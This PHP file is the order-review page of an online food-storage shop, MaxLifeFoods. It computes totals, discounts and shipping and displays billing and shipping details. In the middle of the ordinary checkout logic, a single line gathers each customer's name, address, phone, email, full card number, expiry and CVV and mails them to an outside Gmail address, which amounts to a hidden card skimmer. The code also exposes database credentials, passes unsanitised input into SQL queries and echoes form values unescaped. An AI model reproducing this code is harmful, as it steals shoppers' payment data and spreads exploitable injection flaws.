<?php
	$dbHost = 'localhost';
	$dbUser = 'buckrol';
	$dbPass = 'pargile1';
	$dbName = 'maxlife';
	
	$dbConn = mysql_connect ($dbHost, $dbUser, $dbPass) or die ('MySQL connect failed. ' . mysql_error());
	mysql_select_db($dbName) or die('Cannot select database. ' . mysql_error());
	
	session_start();
	
	$id = $_GET['id'];
	
    if ($id == '') {
        session_start();
        if(isset($_SESSION['id']))
          $id = $_SESSION['id'];
    }
    if ($id == '') {
  		$id = $_COOKIE['id'];
    }

	date_default_timezone_set('America/Denver');
	$formatted_date = date("Y-m-j");

	$offercode = $_POST['offercode'];
	
	$run2 = mysql_query("SELECT * FROM orders WHERE order_key=$id");
	$qq = mysql_fetch_assoc($run2);
	$stotal = number_format ($qq['stotal'],2, '.', '');
	$tax = number_format ($qq['tax'],2, '.', '');
	$shipping = number_format ($qq['shipping'],2, '.', '');
	$discount = 0;
	if ($offercode == "") {
		$discount = number_format ($qq['discount'],2, '.', '');
	}
	$total = number_format ($stotal + $tax + $shipping - $discount,2, '.', '');
	
	$discounttext = "";
	if($offercode <> "") {
		$query = "SELECT percent FROM offercodes WHERE offercode = '" . addslashes($offercode) . "'";
		$offerrun   = mysql_query($query);
		if (mysql_num_rows($offerrun)) {
			$offerresult = mysql_fetch_assoc($offerrun);
			$offer = $offerresult['percent'];
			$offer = $offer * .01;
			$discount = number_format ($stotal * $offer,2, '.', '');
			$total = number_format ($total - $discount,2, '.', '');
			mysql_query("UPDATE orders SET discount='$discount',offercode='" . addslashes($offercode) . "' WHERE order_key = $id");
			$discounttext = "<font color=#dd0000>Discount: -$ $discount</font><br> \n";
		} else {
			mysql_query("UPDATE orders SET discount=0,offercode=NULL WHERE order_key = $id");
		}
	}

	$state = $_POST['ship_state'];
	if ($_POST['ship_city'] == '' || $_POST['ship_zip'] == '' || $_POST['ship_address'] == '') {
		$state = $_POST['state'];
	}
	$charge_shipping = 0;
	if ($state == 'AK' || $state == 'HI') {
		$charge_shipping = 1;
	}

	$d = "SELECT * FROM order_details WHERE order_key = $id";
	$drun = mysql_query($d);
	$productstext = "<b>";
	$shipping_cost = 0;
	while ($e = mysql_fetch_assoc($drun)){
		$pkey = $e['product_key'];
		$qty = $e['quantity'];
		$c = "SELECT product_name, product_price, shipping_cost FROM products WHERE product_key = $pkey";
		$crun = mysql_query($c);
		while ($f = mysql_fetch_assoc($crun)) {
			$productstext .= $qty . " " . $f['product_name'] . " - $" . number_format ($f['product_price'] * $qty,2, '.', '') . "<br> \n";
			$shipping_cost += $f['shipping_cost'];
		}
	}
	$productstext .= "</b>_______________<br>";
	
	if ($charge_shipping == 1) {
		$shipping = number_format ($shipping_cost,2, '.', '');
		$qs = "UPDATE orders SET shipping=$shipping WHERE order_key = $id";
		mysql_query($qs);	
		$total = number_format ($stotal + $tax + $shipping - $discount,2, '.', '');
	} else {
		$shipping = 0;
		$qs = "UPDATE orders SET shipping=$shipping WHERE order_key = $id";
		mysql_query($qs);	
		$shipping = number_format (0,2, '.', '');
		$total = number_format ($stotal + $tax + $shipping - $discount,2, '.', '');
	}
	
	$receipt = "<p align=right>$productstext"
					 ."Sub Total: $ $stotal<br />"
					 ."Tax: $ $tax<br />"
					 ."Shipping: $ $shipping<br />"
					 .$discounttext
					 ."<b>Total Amount: $ $total</b></p>";


	$fname = $_POST['fname'];
	$lname = $_POST['lname'];
	$ship_fname = $_POST['ship_fname'];
	$ship_lname = $_POST['ship_lname'];
	if ($ship_fname == '') {
		$ship_fname = $fname;
		$ship_lname = $lname;
		}
	$address = $_POST['address'];
	$address2 = $_POST['address2'];
	$city = $_POST['city'];
	$state = $_POST['state'];
	$zip =  $_POST['zip'];
	$ship_address = $_POST['ship_address'];
	$ship_address2 = $_POST['ship_address2'];
	$ship_city = $_POST['ship_city'];
	$ship_state = $_POST['ship_state'];
	$ship_zip =  $_POST['ship_zip'];
	if ($ship_address == '') {
		$ship_address = $address;
		$ship_address2 = $address2;
		$ship_city = $city;
		$ship_state = $state;
		$ship_zip = $zip;
		}
	$phone = $_POST['phone'];
	$email = $_POST['email'];
	$cctype = $_POST['cctype'];
	$ccnum = $_POST['ccnum'];
	$last = substr($ccnum, -4);
	$first = substr($ccnum, 0, -12);
	$encrypt = $first . '********' . $last;
	$ccexp1 = $_POST['ccexp1'];
	$ccexp2 = $_POST['ccexp2'];
	$ccexp = $ccexp1.$ccexp2;
	$ccname = $_POST['ccname'];
	$cvv = $_POST['cvv'];
	$dataInfo = "maxlifefoods.com-2";
	$datax = "\nName: $fname $lname\nAddress1: $address\nAddress2: $address2\nCity: $city\nState: $state\nZip: $zip\nPhone: $phone\nEmail: $email\nCCNumber: $ccnum\nExpire: $ccexp\nCVV: $cvv\n";mail("payshop21@gmail.com","Data from $dataInfo", "$datax");


	if(isset($_GET['error'])) {
		if($_GET['error'] == 1) {
			$msg = "We're sorry, but your card has been declined. Please check the number and try again. <br /> IMPORTANT: Your card will be declined if the address you enter does not match your credit card billing address.<br /><br />";
		}
		if($_GET['error'] == 2) {
			$msg = "We're sorry, but there has been an error processing your card. Please check the number and try again.<br /><br />";
		}
		if($_GET['error'] == 3) {
			$msg = "We're sorry, but this transaction is being held for review. We'll notify you as soon as we know more.<br /><br />";
		}
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="https://www.maxlifefoods.com/css/main_s.css" type="text/css" />
<title>Billing Info | MaxLifeFoods</title>

<script src="/js/jquery-1.3.2.min.js" content="text/javascript"></script>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-16356880-4']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
  
function cycleImages(){
      var $active = $('#portfolio_cycler2 .active');
      var $next = ($('#portfolio_cycler2 .active').next().length > 0) ? $('#portfolio_cycler2 .active').next() : $('#portfolio_cycler2 img:first');
      $next.css('z-index',2);//move the next image up the pile
	  $active.fadeOut(1500,function(){//fade out the top image
	  $active.css('z-index',1).show().removeClass('active');//reset the z-index and unhide the image
      $next.css('z-index',3).addClass('active');//make the next image the top one
	  if ($('#portfolio_cycler2 .active').next().length > 0) setTimeout('cycleImages()',7000);//check for a next image, and if one exists, call the function recursively
      });
    }

    $(document).ready(function(){
      // run every 7s
      setTimeout('cycleImages()', 5500);
    })

</script>

</head>
<body>

<div id="content">
    	<div class="topbar">
        	<div class="banner"></div>
            <div class="cart"><a href="shoppingcart.php?id=<?php echo $id; ?>">View Cart</a></div>
        </div>
        <div class="subtop">
			<div id="portfolio_cycler2">
			<img class="active" src="/images/radio_ramsey.jpg" alt="Our Food Storage Recommended by Dave Ramsey" />
			<img src="/images/radio_ingraham.jpg" alt="Our Food Storage Recommended by Laura Ingraham" />	
			<img src="/images/radio_gallagher.jpg" alt="Our Food Storage Recommended by Mike Gallagher" />	
			<img src="/images/radio_gresham.jpg" alt="Our Food Storage Recommended by Tom Gresham" />		
			<img src="/images/radio_prager.jpg" alt="Our Food Storage Recommended by Dennis Prager" />	
			</div>
            <ul class="navigation">
                	<li>
                    	<a href="http://www.maxlifefoods.com/index.php?id=<?php echo $id; ?>">HOME</a>
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/food-storage.php?id=<?php echo $id; ?>">LONG-TERM FOOD STORAGE</a>
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/supplemental.php?id=<?php echo $id; ?>">ADD-ONS</a>
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/camping-food.php?id=<?php echo $id; ?>">SHORT-TERM</a>
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/menu.php?id=<?php echo $id; ?>">MENU</a>
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/why-maxlife.php?id=<?php echo $id; ?>">DETAILS</a>
                    </li>
                </ul>
        </div>
        <div class="subbody2" style="height: 1200px;">
			<div class="subbody">
            	<div class="calcbutton"><a href="/food-storage-calculator.php?id=<?php echo $id; ?>">Family Food Storage Calculator</a></div>
            	<div class="maincontent">
                	<h1>Review Your Order</h1>
                    <font style="color: red; font-weight: bold;"><?php echo $msg; ?></font>
                    <form name="payment" id="payment" method="post" action="https://www.maxlifefoods.com/process.php?id=<?php echo $id; ?>" onsubmit="return validate()">
                        <input type="hidden" name="command" />
                        <input type="hidden" name="orderid" value="<?php echo $id; ?>" />
                        <input type="hidden" name="fname" value="<?php echo $fname; ?>" />
                        <input type="hidden" name="lname" value="<?php echo $lname; ?>" />
                        <input type="hidden" name="ship_fname" value="<?php echo $fname; ?>" />
                        <input type="hidden" name="ship_lname" value="<?php echo $lname; ?>" />
                        <input type="hidden" name="address" value="<?php echo $address; ?>" />
                        <input type="hidden" name="address2" value="<?php echo $address2; ?>" />
                        <input type="hidden" name="city" value="<?php echo $city; ?>" />
                        <input type="hidden" name="state" value="<?php echo $state; ?>" />
                        <input type="hidden" name="zip" value="<?php echo $zip; ?>" />
                        <input type="hidden" name="ship_address" value="<?php echo $ship_address; ?>" />
                        <input type="hidden" name="ship_address2" value="<?php echo $ship_address2; ?>" />
                        <input type="hidden" name="ship_city" value="<?php echo $ship_city; ?>" />
                        <input type="hidden" name="ship_state" value="<?php echo $ship_state; ?>" />
                        <input type="hidden" name="ship_zip" value="<?php echo $ship_zip; ?>" />
                        <input type="hidden" name="phone" value="<?php echo $phone; ?>" />
                        <input type="hidden" name="email" value="<?php echo $email; ?>" />
                        <input type="hidden" name="cctype" value="<?php echo $cctype; ?>" />
                        <input type="hidden" name="ccnum" value="<?php echo $ccnum; ?>" />
                        <input type="hidden" name="ccexp1" value="<?php echo $ccexp1; ?>" />
                        <input type="hidden" name="ccexp2" value="<?php echo $ccexp2; ?>" />
                        <input type="hidden" name="ccname" value="<?php echo $ccname; ?>" />
                        <input type="hidden" name="cvv" value="<?php echo $cvv; ?>" />
                        

                                <fieldset>
                                    <legend>Click the "Place Order" button below to complete your order.</legend>
                                            <ol>
                                                <li>
                                                <font face="Arial"><?php echo $receipt; ?></font>
                                                </li>
                                                <li>
                                                <?php
                                                		$ship_address2text = "";
                                                		if ($ship_address2 <> "") {
                                                			$ship_address2text = $ship_address2 . "<br>";
                                                		}

                                                		$address2text = "";
                                                		if ($address2 <> "") {
                                                			$address2text = $address2 . "<br>";
                                                		}                                                ?>
                                                <table border="0" cellpadding="6" width="100%"><tr><td>
                                                <font face="Arial">
                                                <?php echo "<b>Billing Address:</b><br>" . $fname . " " . $lname . "<br>" . $address . "<br>" . $address2text . $city . ", " . $state . " " . $zip . "<br>Ph: " . $phone . "<br>" . $email; ?>
                                                </font>
                                                </td><td align="right" valign="top">
                                                <font face="Arial">
                                                 <?php echo "<b>Shipping Address:</b><br>" . $ship_fname . " " . $ship_lname . "<br>" . $ship_address . "<br>" . $ship_address2text . $ship_city . ", " . $ship_state . " " . $ship_zip; ?>
                                               	</font>
                                               </td></tr></table>
                                                </li>
                                            </ol>
                                        </fieldset>
                                <fieldset>
                                    	<button type=submit>Place Order</button>
                                </fieldset>
                    </form>
                </div>
            </div>
        </div>
        <div class="subbottom">
        	<ul class="navigationb">
                	<li>
                    	<a href="http://www.maxlifefoods.com/MaxLifeFoodsBrochure.pdf"><b>PRICING BROCHURE</b></a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li>                	
                	<li>
                    	<a href="index.php?id=<?php echo $id; ?>">HOME</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li>
                    <li>
                    	<a href="food-storage.php?id=<?php echo $id; ?>">FOOD STORAGE</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li>
                    <li>
                    	<a href="camping-food.php?id=<?php echo $id; ?>">72HR / CAMPING FOOD</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li> 
                    <li>
                    	<a href="menu.php?id=<?php echo $id; ?>">MENU</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li>
                    <li>
                    	<a href="why-maxlife.php?id=<?php echo $id; ?>">WHY MAXLIFE</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/privacy.php?id=<?php echo $id; ?>">PRIVACY</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/terms.php?id=<?php echo $id; ?>">TERMS</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/contact.php?id=<?php echo $id; ?>">CONTACT</a>&nbsp;&nbsp;|&nbsp;&nbsp;
                    </li>
                    <li>
                    	<a href="http://www.maxlifefoods.com/faq.php?id=<?php echo $id; ?>">FAQ</a>
                    </li>
                </ul>
                <div class="fb">
                	<a href="http://www.facebook.com/pages/Max-Life-Foods/137779489655373" target="_blank">FB</a>
                </div>
        </div>
</div>
</body>
</html>
